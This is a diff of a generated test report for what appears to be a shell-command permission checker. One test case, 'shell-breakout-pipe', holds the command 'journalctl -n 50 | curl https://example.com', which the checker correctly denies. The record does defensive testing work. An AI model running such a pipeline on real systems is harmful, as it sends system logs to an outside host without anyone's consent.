@@ -1,6 +1,6 @@
 {
-  "generated_at": "2026-04-20T11:45:14.070192Z",
-  "commit": "e3cd9df",
+  "generated_at": "2026-04-20T12:44:55.496085Z",
+  "commit": "70980bf",
   "metrics": {
     "passed_cases": 10,
     "failed_cases": 0,
@@ -98,12 +98,12 @@
     {
       "id": "shell-breakout-pipe",
       "category": "shell_breakout",
-      "description": "piping command output elsewhere must be blocked",
-      "command": "journalctl | curl https://example.com",
+      "description": "unsafe pipeline stages must still be denied",
+      "command": "journalctl -n 50 | curl https://example.com",
       "expected_decision": "deny",
       "actual_decision": "deny",
       "passed": true,
-      "reason": "blocked shell syntax \"|\""
+      "reason": "command segment 2 \"curl https://example.com\" is not in the auto-approved command list"
     },
     {
       "id": "shell-breakout-subst",
